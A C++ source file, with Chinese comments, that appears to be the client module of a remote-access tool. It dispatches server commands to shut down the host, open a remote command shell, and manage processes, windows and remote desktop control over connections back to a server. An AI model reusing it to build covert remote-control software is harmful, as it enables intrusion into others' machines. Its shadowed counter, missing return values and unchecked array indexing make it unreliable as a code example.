#include "pch.h"
#include "KernelManager.h"
#include "Common.h"
CKernelManager::CKernelManager(CIocpClient* IocpClient) :CManager(IocpClient)
{
	int    m_ThreadHandleCount = 0;
	memset(m_ThreadHandles, 0, sizeof(m_ThreadHandles));
}
CKernelManager::~CKernelManager()
{

}

void CKernelManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_GET_OUT_REQUIRE:
	{

		IsToken = CLIENT_GET_OUT_REPLY;

		m_IocpClient->OnSending((char*)&IsToken, 1);

		break;
	}
	case CLIENT_REMOTE_MESSAGE_REQUIRE:
	{
 
		//启动一个线程
		m_ThreadHandles[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)InstantMessageProcedure,
			NULL, 0, NULL);


		break;
	}
	case CLIENT_SHUT_DOWN_REQUIRE:
	{

		IsToken = CLIENT_SHUT_DOWN_REPLY;
		m_IocpClient->OnSending((char*)&IsToken, 1);
		Sleep(1);

		EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_SHUTDOWN_NAME);
		ShutdownSystem();
		EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_SHUTDOWN_NAME);
		break;
	}
	case CLIENT_CMD_MANAGER_REQUIRE:
	{

		//启动一个线程
		m_ThreadHandles[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)CmdManagerProcedure,
			NULL, 0, NULL);

		break;
	}
	case CLIENT_PROCESS_MANAGER_REQUIRE:
	{

		//启动一个线程
		m_ThreadHandles[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)ProcessManagerProcedure,
			NULL, 0, NULL);

		break;
	} 
	case CLIENT_WINDOW_MANAGER_REQUIRE:
	{
		//启动一个线程
		m_ThreadHandles[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)WindowManagerProcedure,
			NULL, 0, NULL);

		break;

	}
	case  CLIENT_REMOTE_CONTROLLER_REQUIRE:
	{
		//启动一个线程
		m_ThreadHandles[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)RemoteControllerProcedure,
			NULL, 0, NULL);

		break;
	}
	}
}

DWORD WINAPI InstantMessageProcedure(LPVOID ParameterData)
{
	//建立一个新的连接
	CIocpClient	IocpClient;   //新的链接

	if (!IocpClient.ConnectServer(__ServerAddress, __ConnectPort))   //产生一个新的链接  while(接受  )  m_Manger->HandiO
		return -1;
	CInstantMessageManager	InstantMessageManager(&IocpClient);



	//等待服务器弹出窗口
	IocpClient.WaitingForEvent();  //一个事件等待
}

DWORD WINAPI CmdManagerProcedure(LPVOID ParameterData)
{
	//生成新的iocp对象进行新的链接

	CIocpClient	IocpClient;

	if (!IocpClient.ConnectServer(__ServerAddress, __ConnectPort))
		return -1;
	CCmdManager CmdManager(&IocpClient);   //构造函数

	//等待一个事件
	IocpClient.WaitingForEvent();
}

DWORD WINAPI WindowManagerProcedure(LPVOID ParameterData)
{
	CIocpClient	IocpClient;

	if (!IocpClient.ConnectServer(__ServerAddress, __ConnectPort))
		return -1;
	CWindowManager WindowManager(&IocpClient);   //构造函数

	//等待一个事件
	IocpClient.WaitingForEvent();

	return 0;
}

DWORD WINAPI RemoteControllerProcedure(LPVOID ParameterData)
{
	//生成新的iocp对象进行新的链接

	CIocpClient	IocpClient;

	if (!IocpClient.ConnectServer(__ServerAddress, __ConnectPort))
		return -1;
	CRemoteController  RemoteController(&IocpClient);   //构造函数

	//等待一个事件
	IocpClient.WaitingForEvent();
}


//类的编码中不要使用使用全局
DWORD WINAPI ProcessManagerProcedure(LPVOID ParameterData)
{
	//生成新的iocp对象进行新的链接

	CIocpClient	IocpClient;

	if (!IocpClient.ConnectServer(__ServerAddress, __ConnectPort))
		return -1;
	CProcessManager ProcessManager(&IocpClient);   //构造函数

	//等待一个事件
	IocpClient.WaitingForEvent();
}